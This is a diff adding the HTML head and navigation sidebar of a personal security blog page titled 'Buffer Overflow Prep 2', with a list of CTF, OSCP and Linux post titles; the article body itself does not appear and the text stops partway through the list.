@@ -1,0 +1,1551 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Buffer Overflow Prep 2 | Peanutstick</title>
+  <meta name="keywords" content=" Linux ">
+  <meta name="description" content="Buffer Overflow Prep 2 | Peanutstick">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="It’s the same thing as the prep 1, but I still writing it because it’s my notes. Crashing at 630, it’s useless to be presice like this.If you enter only “A” chars you won’t see the offset in the EIP,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer Overflow Prep 2">
+<meta property="og:url" content="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%202.html">
+<meta property="og:site_name" content="Peanutstick">
+<meta property="og:description" content="It’s the same thing as the prep 1, but I still writing it because it’s my notes. Crashing at 630, it’s useless to be presice like this.If you enter only “A” chars you won’t see the offset in the EIP,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/WKeLvSO.png">
+<meta property="og:image" content="https://i.imgur.com/jQbM42C.png">
+<meta property="og:image" content="https://i.imgur.com/we17ssi.png">
+<meta property="og:image" content="https://i.imgur.com/e89SZaM.png">
+<meta property="og:image" content="https://i.imgur.com/VtyuV2D.png">
+<meta property="og:image" content="https://i.imgur.com/HnkUmkq.png">
+<meta property="og:image" content="https://i.imgur.com/TLfqvUf.png">
+<meta property="og:image" content="https://i.imgur.com/qSrEiWe.png">
+<meta property="og:image" content="https://i.imgur.com/ZuMQeoO.png">
+<meta property="og:image" content="https://i.imgur.com/ymLYsRO.png">
+<meta property="article:published_time" content="2023-02-26T16:10:52.000Z">
+<meta property="article:modified_time" content="2023-02-26T10:34:18.898Z">
+<meta property="article:author" content="Peanutstick">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/WKeLvSO.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//peanutstick.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Peanutstick</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/Peanutstick"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/benjy500c/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(98)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="CTF">
+                        
+                        CTF
+                        <small>(52)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Fix">
+                        
+                        Fix
+                        <small>(5)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Os">
+                        
+                        Os
+                        <small>(19)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Programing">
+                        
+                        Programing
+                        <small>(3)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Security">
+                        
+                        Security
+                        <small>(6)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Service">
+                        
+                        Service
+                        <small>(5)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Tips">
+                        
+                        Tips
+                        <small>(8)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="98">
+<input type="hidden" id="yelog_site_word_count" value="49.1k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://irc.evilcorp.ga/">Evilcorp</a></li>
+            
+            <li><a target="_blank" href="https://github.com/TripleZer000">TripleZer0</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">Contents</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>IRC Python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux, Gaming</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Pentest</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Security</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Tor</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>VPN</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All Security "
+           href="/post/Buffer%20Overflow%20Prep%202.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Buffer Overflow Prep 2">Buffer Overflow Prep 2</span>
+            <span class="post-date" title="2023-02-26 17:10:52">2023/02/26</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Buffer Overflow Prep 1">Buffer Overflow Prep 1</span>
+            <span class="post-date" title="2023-02-25 21:30:52">2023/02/25</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_BoilCTF.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF BoilCTF">CTF BoilCTF</span>
+            <span class="post-date" title="2023-02-19 19:00:55">2023/02/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Wekor.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Wekor">CTF Wekor</span>
+            <span class="post-date" title="2023-02-19 04:57:52">2023/02/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Plotted-LMS.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Plotted-LMS">CTF Plotted-LMS</span>
+            <span class="post-date" title="2023-02-16 15:30:52">2023/02/16</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Install%20of%20kali%20on%20Arch%20with%20QEMU.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Install Kali with QEMU">Install Kali with QEMU</span>
+            <span class="post-date" title="2023-02-11 01:56:09">2023/02/11</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Cheat%20sheet.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Cheat Sheet for the OSCP">Cheat Sheet for the OSCP</span>
+            <span class="post-date" title="2023-02-07 03:09:52">2023/02/07</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Wgel_CTF.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Wgel CTF">CTF Wgel CTF</span>
+            <span class="post-date" title="2023-02-05 19:20:02">2023/02/05</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Year%20of%20the%20Rabbit.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Year of the Rabbit">CTF Year of the Rabbit</span>
+            <span class="post-date" title="2023-02-02 19:20:02">2023/02/02</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/CVE-2023-24055_KeePass_2.5x.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CVE-2023-24055 KeePass 2.5x">CVE-2023-24055 KeePass 2.5x</span>
+            <span class="post-date" title="2023-01-31 05:15:52">2023/01/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Ignite.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Ignite">CTF Ignite</span>
+            <span class="post-date" title="2023-01-29 18:20:02">2023/01/29</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Learn%20CTF%20on%20windows.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Learn CTF on windows">Learn CTF on windows</span>
+            <span class="post-date" title="2023-01-14 19:26:00">2023/01/14</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Relevant.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Relevant">CTF Relevant</span>
+            <span class="post-date" title="2023-01-13 11:18:57">2023/01/13</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Bypass%20yt%20restriction.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Bypass yt restriction">Bypass yt restriction</span>
+            <span class="post-date" title="2023-01-12 22:25:02">2023/01/12</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Daily%20Bugle.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF  Daily Bugle">CTF  Daily Bugle</span>
+            <span class="post-date" title="2023-01-12 19:20:02">2023/01/12</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Internal.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Internal">CTF Internal</span>
+            <span class="post-date" title="2023-01-11 19:20:02">2023/01/11</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Mr_Robot_HTB.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Mr Robot">CTF Mr Robot</span>
+            <span class="post-date" title="2023-01-09 02:51:02">2023/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Crocc%20Crew.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Crocc Crew">CTF Crocc Crew</span>
+            <span class="post-date" title="2022-12-23 08:02:40">2022/12/23</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Init.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Init">CTF Init</span>
+            <span class="post-date" title="2022-11-13 12:14:10">2022/11/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_SecretRezip.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF SecretRezip">CTF SecretRezip</span>
+            <span class="post-date" title="2022-11-10 20:25:36">2022/11/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Hackfest%202016.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Hackfest 2016">CTF Hackfest 2016</span>
+            <span class="post-date" title="2022-10-26 20:21:07">2022/10/26</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Eric.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Eric">CTF Eric</span>
+            <span class="post-date" title="2022-10-20 14:11:51">2022/10/20</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Hacksudo3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Hacksudo3">CTF Hacksudo3</span>
+            <span class="post-date" title="2022-10-18 18:48:30">2022/10/18</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Micro_Storage.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Micro Storage">CTF Micro Storage</span>
+            <span class="post-date" title="2022-10-16 22:25:19">2022/10/16</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/Eternal%20Loop.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Eternal Loop">Eternal Loop</span>
+            <span class="post-date" title="2022-09-26 02:15:52">2022/09/26</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Fresh%20install%20of%20Arch.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fresh install of Arch">Fresh install of Arch</span>
+            <span class="post-date" title="2022-07-09 19:30:52">2022/07/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/DIGITALWORLD%20FALL.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="DIGITALWORLD: FALL ">DIGITALWORLD: FALL </span>
+            <span class="post-date" title="2022-07-03 06:30:52">2022/07/03</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Victim%201.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Victim1: ">CTF Victim1: </span>
+            <span class="post-date" title="2022-06-26 23:48:52">2022/06/26</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Linux%20From%20Scratch.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Install Linux From Scratch">Install Linux From Scratch</span>
+            <span class="post-date" title="2022-06-18 23:48:52">2022/06/18</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Silky_0x01.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Silky 0x01">CTF Silky 0x01</span>
+            <span class="post-date" title="2022-06-12 18:44:52">2022/06/12</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Beelzebub.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Beelzebub">CTF Beelzebub</span>
+            <span class="post-date" title="2022-06-09 19:29:02">2022/06/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Shibboleth.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Shibboleth">CTF Shibboleth</span>
+            <span class="post-date" title="2022-03-13 00:29:02">2022/03/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_PwnLab.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF PwnLab">CTF PwnLab</span>
+            <span class="post-date" title="2022-03-06 04:07:56">2022/03/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Simple_CTF.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF simple CTF">CTF simple CTF</span>
+            <span class="post-date" title="2022-03-03 01:20:52">2022/03/03</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_hacker_kid.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF hacker kid">CTF hacker kid</span>
+            <span class="post-date" title="2022-02-28 03:19:25">2022/02/28</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/How_to_gain_some_GiB_on_Arch_Linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How to gain some GiB on Arch Linux">How to gain some GiB on Arch Linux</span>
+            <span class="post-date" title="2022-02-21 03:15:52">2022/02/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_jordaninfosec.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Jordaninfosec">CTF Jordaninfosec</span>
+            <span class="post-date" title="2022-02-17 22:11:00">2022/02/17</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Deathnote.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Deathnote">CTF Deathnote</span>
+            <span class="post-date" title="2022-02-08 02:20:57">2022/02/08</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Paper.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Paper">CTF Paper</span>
+            <span class="post-date" title="2022-02-06 04:07:56">2022/02/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Pandora.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Pandora">CTF Pandora</span>
+            <span class="post-date" title="2022-02-05 01:30:52">2022/02/05</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Meta.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Meta">CTF Meta</span>
+            <span class="post-date" title="2022-02-02 03:15:02">2022/02/02</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Secret.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Secret">CTF Secret</span>
+            <span class="post-date" title="2022-01-31 00:29:02">2022/01/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Backdoor.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Backdoor">CTF Backdoor</span>
+            <span class="post-date" title="2022-01-29 22:19:25">2022/01/29</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Horizontall.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Horizontall">CTF Horizontall</span>
+            <span class="post-date" title="2022-01-23 20:42:51">2022/01/23</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Toppo.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Toppo">CTF Toppo</span>
+            <span class="post-date" title="2022-01-22 17:54:42">2022/01/22</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Walpaper_selector_with_sxiv.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Wallpaper selector with sxiv">Wallpaper selector with sxiv</span>
+            <span class="post-date" title="2022-01-22 02:35:56">2022/01/22</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_cybersploit.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF cybersploit">CTF cybersploit</span>
+            <span class="post-date" title="2022-01-21 20:19:23">2022/01/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_unknowndevice64-1.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF unknowndevice64-1">CTF unknowndevice64-1</span>
+            <span class="post-date" title="2022-01-19 20:51:42">2022/01/19</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Record_screen_with_ffmpeg.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Record screen with ffmpeg">Record screen with ffmpeg</span>
+            <span class="post-date" title="2022-01-19 01:56:09">2022/01/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_commands_and_files.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF commands and files">CTF commands and files</span>
+            <span class="post-date" title="2022-01-17 22:55:38">2022/01/17</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/set_up_smb.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="set up smb">set up smb</span>
+            <span class="post-date" title="2022-01-16 05:01:27">2022/01/16</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Stapler.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Stapler">CTF Stapler</span>
+            <span class="post-date" title="2022-01-15 01:07:29">2022/01/15</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Create_a_polybar_module.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Create a polybar module">Create a polybar module</span>
+            <span class="post-date" title="2022-01-12 23:09:01">2022/01/12</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Replacing_xfce4_bar_by_Polybar.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Replacing xfce4 bar by Polybar">Replacing xfce4 bar by Polybar</span>
+            <span class="post-date" title="2022-01-12 00:57:59">2022/01/12</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Script_to_create_my_article_page.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Script to create my article page.">Script to create my article page.</span>
+            <span class="post-date" title="2022-01-11 22:30:34">2022/01/11</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Cut_an_online_video_with_ffmpeg.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Cut an online video with ffmpeg">Cut an online video with ffmpeg</span>
+            <span class="post-date" title="2022-01-11 03:15:52">2022/01/11</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Stream_audio_video_at_home.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Create a locale stream">Create a locale stream</span>
+            <span class="post-date" title="2022-01-09 19:18:22">2022/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_SickOs.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF_SickOs">CTF_SickOs</span>
+            <span class="post-date" title="2022-01-09 01:15:52">2022/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Dina.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Dinae">CTF Dinae</span>
+            <span class="post-date" title="2022-01-08 22:16:52">2022/01/08</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/weather.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Weather in CLI">Weather in CLI</span>
+            <span class="post-date" title="2022-01-06 18:15:52">2022/01/06</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/switch_from_i3_to_bspwm.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Switch from i3 to bspwm">Switch from i3 to bspwm</span>
+            <span class="post-date" title="2022-01-01 01:37:52">2022/01/01</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix_teams.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fix my spyware is stuck in the login loop (Microsoft teams)">Fix my spyware is stuck in the login loop (Microsoft teams)</span>
+            <span class="post-date" title="2021-12-27 21:15:52">2021/12/27</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/nitrogen_with_wal.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How do I setup nitrogen &amp; pywal">How do I setup nitrogen &amp; pywal</span>
+            <span class="post-date" title="2021-12-25 03:15:52">2021/12/25</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Setup_Xfce_with_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Setup_Xfce_with_i3">Setup_Xfce_with_i3</span>
+            <span class="post-date" title="2021-12-24 05:17:00">2021/12/24</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Set_firewall_ufw.html"
+           data-tag="Security"
+           data-author="" >
+            <span class="post-title" title="Set up a firewall with ufw">Set up a firewall with ufw</span>
+            <span class="post-date" title="2021-11-01 20:05:52">2021/11/01</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Port_knocking.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set up port knocking server to hide an open port">Set up port knocking server to hide an open port</span>
+            <span class="post-date" title="2021-10-31 01:15:52">2021/10/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Ambassador.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Ambassador">CTF Ambassador</span>
+            <span class="post-date" title="2021-10-10 03:09:05">2021/10/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_M0rsarchive.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF M0rsarchive">CTF M0rsarchive</span>
+            <span class="post-date" title="2021-10-10 03:09:05">2021/10/10</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Photobomb.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Photobomb">CTF Photobomb</span>
+            <span class="post-date" title="2021-10-09 18:09:05">2021/10/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Trick.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Trick">CTF Trick</span>
+            <span class="post-date" title="2021-10-06 01:40:52">2021/10/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_IMF.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF IMF">CTF IMF</span>
+            <span class="post-date" title="2021-10-04 01:40:52">2021/10/04</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Choppy.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Choppy">CTF Choppy</span>
+            <span class="post-date" title="2021-10-02 01:15:52">2021/10/02</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Tr0ll.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Tr0ll">CTF Tr0ll</span>
+            <span class="post-date" title="2021-10-02 01:15:52">2021/10/02</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Run_games_on_lutris_with_proton.html"
+           data-tag="Linux, Gaming"
+           data-author="" >
+            <span class="post-title" title="Run non steam game with proton on lutris">Run non steam game with proton on lutris</span>
+            <span class="post-date" title="2021-09-15 04:40:52">2021/09/15</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Add-windows-to-grub.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Add windows to grub">Add windows to grub</span>
+            <span class="post-date" title="2021-08-28 07:54:52">2021/08/28</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/gparted.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Resize the main partion with gparted">Resize the main partion with gparted</span>
+            <span class="post-date" title="2021-08-27 17:08:52">2021/08/27</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/cheat-sheet.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Cheat Sheet of the commands I use">Cheat Sheet of the commands I use</span>
+            <span class="post-date" title="2021-08-08 17:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Ted.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Ted">CTF Ted</span>
+            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Set_polybar_on_2_screen.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set Polybar on 2 screens">Set Polybar on 2 screens</span>
+            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Change_screen_resolution.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Change screen resolution with xandr">Change screen resolution with xandr</span>
+            <span class="post-date" title="2021-08-02 04:15:52">2021/08/02</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Low_fps_in_games.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="My games are unplayable">My games are unplayable</span>
+            <span class="post-date" title="2021-08-01 19:15:52">2021/08/01</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Set_shortcut_for_brightness.html"
+           data-tag="Linux"
+           data-author="" >
